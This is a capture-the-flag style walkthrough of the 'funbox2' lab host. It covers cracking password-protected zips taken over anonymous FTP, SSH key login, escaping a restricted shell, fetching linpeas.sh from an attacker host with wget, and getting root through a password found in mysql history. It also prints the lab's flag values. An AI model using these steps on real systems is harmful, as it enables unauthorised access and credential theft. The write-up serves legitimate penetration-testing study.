---
custom_edit_url: null
---

## Reconnaissance

### Nmap scan

Let's perform an `nmap` scan to find the open ports and the services running on the open ports.

```
$ nmap -Pn -p- -A -T5 192.168.165.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 01:49 EDT
Warning: 192.168.165.107 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.165.107
Host is up (0.066s latency).
Not shown: 64094 closed tcp ports (conn-refused), 1438 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 312.65 seconds
```

There are three open ports:

| Port | Service |
| :--- | :------ |
| 21   | ftp     |
| 22   | ssh     |
| 80   | http    |

### Port 21 (FTP) enumeration

From the Nmap scan we can see that Anonymous login is allowed for FTP. Let's try it.

| Username  | Password  |
| :-------- | :-------- |
| anonymous | anonymous |

```
$ ftp 192.168.165.107                                                        
Connected to 192.168.165.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.165.107]
Name (192.168.165.107:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.45.234 !
230-
230-The local time is: Sun Aug 11 06:03:13 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

```
ftp> ls
229 Entering Extended Passive Mode (|||62919|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
```

Before we download the files, we have to turn the passive mode off.

```
ftp> passive
Passive mode: off; fallback to active mode: off.
```

Now we can download the files using the `mget` command.

```
ftp> mget *
mget jessica.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for jessica.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477        1.37 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (22.10 KiB/s)
mget bud.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for bud.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477        1.32 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.22 KiB/s)
mget marge.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for marge.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477       48.57 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.78 KiB/s)
mget miriam.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for miriam.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477        1.99 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.45 KiB/s)
mget homer.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for homer.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477       42.68 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.82 KiB/s)
mget john.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for john.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477       15.14 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.82 KiB/s)
mget cathrine.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for cathrine.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477        5.77 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (22.54 KiB/s)
mget ariel.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for ariel.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477       35.21 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (22.61 KiB/s)
mget anna.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for anna.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477      723.72 KiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.06 KiB/s)
mget welcome.msg [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for welcome.msg (170 bytes)
100% |***********************************************************************************************************************************************************************************************|   170        4.50 MiB/s    00:00 ETA
226 Transfer complete
170 bytes received in 00:00 (2.65 KiB/s)
mget tom.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for tom.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477        8.74 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.26 KiB/s)
mget zlatan.zip [anpqy?]? y
200 EPRT command successful
150 Opening BINARY mode data connection for zlatan.zip (1477 bytes)
100% |***********************************************************************************************************************************************************************************************|  1477        2.27 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.81 KiB/s)
```

### Cracking ZIP password

All the zip files are password protected and hold SSH private keys.

We have to convert the ZIP files into a file format required by John the Ripper. The following command will loop through all the files in the current directory.

```
$ for file in *.zip; do sudo zip2john "$file" > "${file%.zip}.hash"; done
```

Now we can crack the passwords using John the Ripper or `john`.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt *.hash
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iubire           (tom.zip/id_rsa)     
catwoman         (cathrine.zip/id_rsa)     
2g 0:00:00:05 DONE (2024-08-11 02:11) 0.3344g/s 2398Kp/s 2399Kc/s 2399KC/s !LUVDKR!..*7¡Vamos!
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Since we know the passwords for the `tom.zip` and `cathrine.zip` files, we can now unzip them.

```
$ unzip -d ./tom tom.zip
Archive:  tom.zip
[tom.zip] id_rsa password: 
  inflating: ./tom/id_rsa     
```

```
$ unzip -d ./cathrine cathrine.zip
Archive:  cathrine.zip
[cathrine.zip] id_rsa password: 
  inflating: ./cathrine/id_rsa  
```

Next, we have to set the file permission to `600`.

```
$ chmod 600 tom/id_rsa 
```

```
$ chmod 600 cathrine/id_rsa
```

&nbsp;

## Exploitation

### SSH login

Let's try to login as `cathrine` via SSH.

```
$ ssh -i cathrine/id_rsa cathrine@192.168.165.107
The authenticity of host '192.168.165.107 (192.168.165.107)' can't be established.
ED25519 key fingerprint is SHA256:ZBER3N78DusT56jsi/IGcAxcCB2W5CZWUJTbc3K4bZc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.165.107' (ED25519) to the list of known hosts.
Connection closed by 192.168.165.107 port 22
```

Doesn't work. Let's try to login as `tom`.

```
$ ssh -i tom/id_rsa tom@192.168.165.107
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 11 06:20:16 UTC 2024

  System load:  0.0               Processes:             162
  Usage of /:   74.2% of 4.37GB   Users logged in:       0
  Memory usage: 36%               IP address for ens256: 192.168.165.107
  Swap usage:   0%


30 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ 
```

&nbsp;

## Post Exploitation

### local.txt

```
tom@funbox2:~$ cat local.txt
8e2fa1aeed975ff3fbbf132700bf9d4c
```

### Escaping restricted shell

Once we obtain a foothold on the target, we quickly realize that most commands are not allowed.

```
tom@funbox2:~$ cd tmp
-rbash: cd: restricted
```

We can escape the restriction is we use the `-t "bash --noprofile"` option while logging in via SSH.

```
$ ssh -i tom/id_rsa tom@192.168.165.107 -t "bash --noprofile" 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ 
```

```
tom@funbox2:~$ cd tmp
tom@funbox2:~/tmp$ 
```

### Privilege Escalation (vector 1)

#### Enumerating Privilege Escalation vectors using Linpeas

In order to find a privilege escalation vector we have to use the [Linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240804-31b931f7) utility.

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
tom@funbox2:~/tmp$ wget http://192.168.45.234:8000/linpeas.sh
--2024-08-11 06:30:45--  http://192.168.45.234:8000/linpeas.sh
Connecting to 192.168.45.234:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 860335 (840K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 840.17K  1.53MB/s    in 0.5s    

2024-08-11 06:30:45 (1.53 MB/s) - ‘linpeas.sh’ saved [860335/860335]
```

Let's make the file executable.

```
tom@funbox2:~/tmp$ chmod +x linpeas.sh 
```

Now we can run the `./linpeas.sh` script.

```

```



### Privilege Escalation (vector 2)

Let's look at the contents of the home directory.

```
tom@funbox2:~$ ls -la
total 52
drwxr-xr-x 7 tom  tom  4096 Aug 11 06:32 .
drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
-rw------- 1 tom  tom   156 Aug 11 06:29 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4096 Aug 11 06:20 .cache
drwxr-x--- 3 tom  tom  4096 Aug 11 06:32 .config
drwx------ 3 tom  tom  4096 Aug 11 06:32 .gnupg
-rw-r--r-- 1 tom  tom    33 Aug 11 05:46 local.txt
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh
drwxrwxr-x 2 tom  tom  4096 Aug 11 06:30 tmp
```

Let's cat out the `.msql_history` file.

```
tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

Seems like tom's password is `xx11yy22!`.

| Username | Password  |
| -------- | --------- |
| tom      | xx11yy22! |

#### Misconfigured Sudo privileges

Let's check what commands `tom` can run with `root` privileges without needing a password. When prompted, we have to provide the password we just found.

```
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
```

We can run any command as `tom` with `root` privileges.

```
tom@funbox2:~$ sudo su
root@funbox2:/home/tom# 
```

### proof.txt

```
root@funbox2:/home/tom# cat /root/proof.txt
0ade006e5f79df35a906c24e19eedecf
```
